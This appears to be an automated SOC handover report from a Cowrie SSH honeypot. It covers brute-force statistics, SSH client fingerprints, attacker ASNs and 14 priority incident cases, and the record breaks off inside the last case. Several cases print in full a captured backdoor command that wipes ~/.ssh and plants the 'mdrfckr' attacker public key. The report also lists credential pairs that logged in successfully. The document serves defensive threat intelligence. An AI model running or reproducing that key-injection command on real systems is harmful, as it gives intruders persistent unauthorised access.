# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-09 |
| **Generated At** | 2026-05-09T09:24:11Z |
| **Shift Time** | 09:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **153** |
| Confirmed Threats | **136** |
| False Positives Filtered | **17** (11.1%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **14** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **139** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **76** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **22** |
| Unique Passwords | **36** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `ubuntu` | 11 |
| `admin` | 10 |
| `345gs5662d34` | 6 |
| `test` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 7 |
| `345gs5662d34` | 6 |
| `gfhjkm` | 2 |
| `dragon` | 2 |
| `test@12345` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 7 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `user` | `gfhjkm` | 2 |
| `admin` | `dragon` | 2 |
| `test` | `test@12345` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test1test` | `186.118.142.245` | 2026-05-09T06:33:00 |
| `root` | `3245gs5662d34` | `186.118.142.245` | 2026-05-09T06:33:07 |
| `root` | `oracle@123` | `186.118.142.245` | 2026-05-09T06:37:37 |
| `root` | `admin001` | `186.118.142.245` | 2026-05-09T06:44:20 |
| `root` | `test1test` | `101.47.158.56` | 2026-05-09T07:03:03 |
| `root` | `3245gs5662d34` | `101.47.158.56` | 2026-05-09T07:03:06 |
| `root` | `admin001` | `101.47.158.56` | 2026-05-09T07:13:51 |
| `root` | `oracle@123` | `101.47.158.56` | 2026-05-09T07:14:50 |
| `root` | `devserver` | `119.41.148.145` | 2026-05-09T07:41:03 |
| `root` | `3245gs5662d34` | `119.41.148.145` | 2026-05-09T07:41:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **153** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 89 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 71 | 2 |
| `03a80b21afa8...` | Modern SSH client | 11 | 2 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `0a07365cc01f...` | Generic scanner | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 71 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 11 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `119.41.148.145`, `186.118.142.245`, `101.47.158.56`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **26** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS7303` | Telecom Argentina S.A. | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS135161` | GMO-Z com NetDesign Holdings Co., Ltd. | 1 | HIGH |
| `AS56207` | ComClark Network & Technology Corp | 1 | LOW |
| `AS139831` | DITO TELECOMMUNITY CORP. | 1 | LOW |
| `AS3816` | COLOMBIA TELECOMUNICACIONES S.A. ESP BIC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6cbbc9fb1254

| Field | Detail |
|---|---|
| **Source IP** | `186.118.142[.]245` |
| **First Seen** | 2026-05-09 06:32 |
| **Last Seen** | 2026-05-09 06:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 06:32:58` | `cowrie.session.connect` |
| `2026-05-09 06:32:58` | `cowrie.client.version` |
| `2026-05-09 06:32:58` | `cowrie.client.kex` |
| `2026-05-09 06:33:00` | `cowrie.login.success` |
| `2026-05-09 06:33:00` | `cowrie.session.params` |
| `2026-05-09 06:33:00` | `cowrie.command.input` |
| `2026-05-09 06:33:00` | `cowrie.command.failed` |
| `2026-05-09 06:33:01` | `cowrie.log.closed` |
| `2026-05-09 06:33:01` | `cowrie.session.params` |
| `2026-05-09 06:33:01` | `cowrie.command.input` |
| `2026-05-09 06:33:02` | `cowrie.session.file_download` |
| `2026-05-09 06:33:02` | `cowrie.log.closed` |
| `2026-05-09 06:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.118.142[.]245` to AbuseIPDB if not already reported
- [ ] Block `186.118.142[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e938f52d50b1

| Field | Detail |
|---|---|
| **Source IP** | `186.118.142[.]245` |
| **First Seen** | 2026-05-09 06:33 |
| **Last Seen** | 2026-05-09 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 06:33:05` | `cowrie.session.connect` |
| `2026-05-09 06:33:05` | `cowrie.client.version` |
| `2026-05-09 06:33:05` | `cowrie.client.kex` |
| `2026-05-09 06:33:07` | `cowrie.login.success` |
| `2026-05-09 06:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.118.142[.]245` to AbuseIPDB if not already reported
- [ ] Block `186.118.142[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795b7b9b3c91

| Field | Detail |
|---|---|
| **Source IP** | `186.118.142[.]245` |
| **First Seen** | 2026-05-09 06:37 |
| **Last Seen** | 2026-05-09 06:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 06:37:35` | `cowrie.session.connect` |
| `2026-05-09 06:37:35` | `cowrie.client.version` |
| `2026-05-09 06:37:36` | `cowrie.client.kex` |
| `2026-05-09 06:37:37` | `cowrie.login.success` |
| `2026-05-09 06:37:38` | `cowrie.session.params` |
| `2026-05-09 06:37:38` | `cowrie.command.input` |
| `2026-05-09 06:37:38` | `cowrie.command.failed` |
| `2026-05-09 06:37:38` | `cowrie.log.closed` |
| `2026-05-09 06:37:39` | `cowrie.session.params` |
| `2026-05-09 06:37:39` | `cowrie.command.input` |
| `2026-05-09 06:37:39` | `cowrie.session.file_download` |
| `2026-05-09 06:37:39` | `cowrie.log.closed` |
| `2026-05-09 06:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.118.142[.]245` to AbuseIPDB if not already reported
- [ ] Block `186.118.142[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d1c821256b

| Field | Detail |
|---|---|
| **Source IP** | `186.118.142[.]245` |
| **First Seen** | 2026-05-09 06:37 |
| **Last Seen** | 2026-05-09 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 06:37:43` | `cowrie.session.connect` |
| `2026-05-09 06:37:43` | `cowrie.client.version` |
| `2026-05-09 06:37:43` | `cowrie.client.kex` |
| `2026-05-09 06:37:44` | `cowrie.login.success` |
| `2026-05-09 06:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.118.142[.]245` to AbuseIPDB if not already reported
- [ ] Block `186.118.142[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd380c1aa16

| Field | Detail |
|---|---|
| **Source IP** | `186.118.142[.]245` |
| **First Seen** | 2026-05-09 06:44 |
| **Last Seen** | 2026-05-09 06:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 06:44:19` | `cowrie.session.connect` |
| `2026-05-09 06:44:19` | `cowrie.client.version` |
| `2026-05-09 06:44:19` | `cowrie.client.kex` |
| `2026-05-09 06:44:20` | `cowrie.login.success` |
| `2026-05-09 06:44:21` | `cowrie.session.params` |
| `2026-05-09 06:44:21` | `cowrie.command.input` |
| `2026-05-09 06:44:21` | `cowrie.command.failed` |
| `2026-05-09 06:44:21` | `cowrie.log.closed` |
| `2026-05-09 06:44:22` | `cowrie.session.params` |
| `2026-05-09 06:44:22` | `cowrie.command.input` |
| `2026-05-09 06:44:22` | `cowrie.session.file_download` |
| `2026-05-09 06:44:22` | `cowrie.log.closed` |
| `2026-05-09 06:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.118.142[.]245` to AbuseIPDB if not already reported
- [ ] Block `186.118.142[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc35b05de39b

| Field | Detail |
|---|---|
| **Source IP** | `186.118.142[.]245` |
| **First Seen** | 2026-05-09 06:44 |
| **Last Seen** | 2026-05-09 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 06:44:26` | `cowrie.session.connect` |
| `2026-05-09 06:44:26` | `cowrie.client.version` |
| `2026-05-09 06:44:26` | `cowrie.client.kex` |
| `2026-05-09 06:44:27` | `cowrie.login.success` |
| `2026-05-09 06:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.118.142[.]245` to AbuseIPDB if not already reported
- [ ] Block `186.118.142[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab83003d4dae

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-05-09 07:03 |
| **Last Seen** | 2026-05-09 07:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:03:02` | `cowrie.session.connect` |
| `2026-05-09 07:03:02` | `cowrie.client.version` |
| `2026-05-09 07:03:02` | `cowrie.client.kex` |
| `2026-05-09 07:03:03` | `cowrie.login.success` |
| `2026-05-09 07:03:03` | `cowrie.session.params` |
| `2026-05-09 07:03:03` | `cowrie.command.input` |
| `2026-05-09 07:03:03` | `cowrie.command.failed` |
| `2026-05-09 07:03:03` | `cowrie.log.closed` |
| `2026-05-09 07:03:03` | `cowrie.session.params` |
| `2026-05-09 07:03:03` | `cowrie.command.input` |
| `2026-05-09 07:03:03` | `cowrie.session.file_download` |
| `2026-05-09 07:03:03` | `cowrie.log.closed` |
| `2026-05-09 07:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c2da8f5bc2

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-05-09 07:03 |
| **Last Seen** | 2026-05-09 07:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:03:06` | `cowrie.session.connect` |
| `2026-05-09 07:03:06` | `cowrie.client.version` |
| `2026-05-09 07:03:06` | `cowrie.client.kex` |
| `2026-05-09 07:03:06` | `cowrie.login.success` |
| `2026-05-09 07:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb4e82634ffe

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-05-09 07:13 |
| **Last Seen** | 2026-05-09 07:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:13:50` | `cowrie.session.connect` |
| `2026-05-09 07:13:50` | `cowrie.client.version` |
| `2026-05-09 07:13:51` | `cowrie.client.kex` |
| `2026-05-09 07:13:51` | `cowrie.login.success` |
| `2026-05-09 07:13:51` | `cowrie.session.params` |
| `2026-05-09 07:13:51` | `cowrie.command.input` |
| `2026-05-09 07:13:51` | `cowrie.command.failed` |
| `2026-05-09 07:13:52` | `cowrie.log.closed` |
| `2026-05-09 07:13:52` | `cowrie.session.params` |
| `2026-05-09 07:13:52` | `cowrie.command.input` |
| `2026-05-09 07:13:52` | `cowrie.session.file_download` |
| `2026-05-09 07:13:52` | `cowrie.log.closed` |
| `2026-05-09 07:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4937a6fdfdd8

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-05-09 07:13 |
| **Last Seen** | 2026-05-09 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:13:54` | `cowrie.session.connect` |
| `2026-05-09 07:13:54` | `cowrie.client.version` |
| `2026-05-09 07:13:54` | `cowrie.client.kex` |
| `2026-05-09 07:13:55` | `cowrie.login.success` |
| `2026-05-09 07:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c27ab1fd4d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-05-09 07:14 |
| **Last Seen** | 2026-05-09 07:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:14:49` | `cowrie.session.connect` |
| `2026-05-09 07:14:49` | `cowrie.client.version` |
| `2026-05-09 07:14:49` | `cowrie.client.kex` |
| `2026-05-09 07:14:50` | `cowrie.login.success` |
| `2026-05-09 07:14:50` | `cowrie.session.params` |
| `2026-05-09 07:14:50` | `cowrie.command.input` |
| `2026-05-09 07:14:50` | `cowrie.command.failed` |
| `2026-05-09 07:14:50` | `cowrie.log.closed` |
| `2026-05-09 07:14:51` | `cowrie.session.params` |
| `2026-05-09 07:14:51` | `cowrie.command.input` |
| `2026-05-09 07:14:51` | `cowrie.session.file_download` |
| `2026-05-09 07:14:51` | `cowrie.log.closed` |
| `2026-05-09 07:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb7db2f0ffa

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-05-09 07:14 |
| **Last Seen** | 2026-05-09 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:14:53` | `cowrie.session.connect` |
| `2026-05-09 07:14:53` | `cowrie.client.version` |
| `2026-05-09 07:14:53` | `cowrie.client.kex` |
| `2026-05-09 07:14:54` | `cowrie.login.success` |
| `2026-05-09 07:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dab84c5fac7

| Field | Detail |
|---|---|
| **Source IP** | `119.41.148[.]145` |
| **First Seen** | 2026-05-09 07:41 |
| **Last Seen** | 2026-05-09 07:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 07:41:02` | `cowrie.session.connect` |
| `2026-05-09 07:41:02` | `cowrie.client.version` |
| `2026-05-09 07:41:03` | `cowrie.client.kex` |
| `2026-05-09 07:41:03` | `cowrie.login.success` |
| `2026-05-09 07:41:03` | `cowrie.session.params` |
| `2026-05-09 07:41:03` | `cowrie.command.input` |
| `2026-05-09 07:41:03` | `cowrie.command.failed` |
| `2026-05-09 07:41:03` | `cowrie.log.closed` |
| `2026-05-09 07:41:04` | `cowrie.session.params` |
| `2026-05-09 07:41:04` | `cowrie.command.input` |
| `2026-05-09 07:41:04` | `cowrie.session.file_download` |
| `2026-05-09 07:41:04` | `cowrie.log.closed` |
| `2026-05-09 07:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.41.148[.]145` to AbuseIPDB if not already reported
- [ ] Block `119.41.148[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
